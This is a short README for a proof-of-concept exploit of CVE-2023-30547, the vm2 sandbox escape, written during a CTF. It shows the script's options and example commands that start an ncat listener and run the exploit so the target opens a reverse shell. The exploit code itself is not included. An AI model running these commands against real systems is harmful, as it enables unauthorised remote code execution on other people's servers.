# CVE-2023-30547
This is a Proof-of-Concept to CVE-2023-30547 (https://nvd.nist.gov/vuln/detail/CVE-2023-30547). I created this PoC during a CTF.

## Usage
```bash
CVE-2023-30547 PoC [-h] [--url URL] [--lhost LHOST] [--lport LPORT]

PoC for the vm2 vulnerability CVE-2023-30547

options:
  -h, --help     show this help message and exit
  --url URL      Target URL
  --lhost LHOST  IP of the local host for a reverse shell
  --lport LPORT  Port of the local host for a reverse shell
```

## Example:
1. Terminal:
```bash
$ ncat -lnvp 1337
```
2. Terminal:
```bash
$ python3 exploit.py --url "http://vulnhost.local/run" --lhost 127.0.0.1 --lport 1337
```
